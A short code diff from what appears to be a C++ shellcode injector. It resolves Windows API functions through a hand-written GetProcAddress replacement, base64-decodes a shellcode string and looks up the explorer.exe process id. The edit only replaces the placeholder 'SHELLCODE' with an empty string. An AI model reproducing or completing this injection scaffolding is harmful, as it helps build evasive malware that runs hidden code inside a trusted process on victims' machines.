@@ -173,7 +173,7 @@ int main() {
     CloseHandle_ptr = (pCloseHandle)get_proc_address_manual(h_kernel32, close_handle_str);
     VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, virtual_free_ex_str);
 
-    std::string en_sh = "SHELLCODE";
+    std::string en_sh = "";
 
     std::string dshell = base64_decode(en_sh);
     proc_id = get_proc_id(explorer_exe_str);
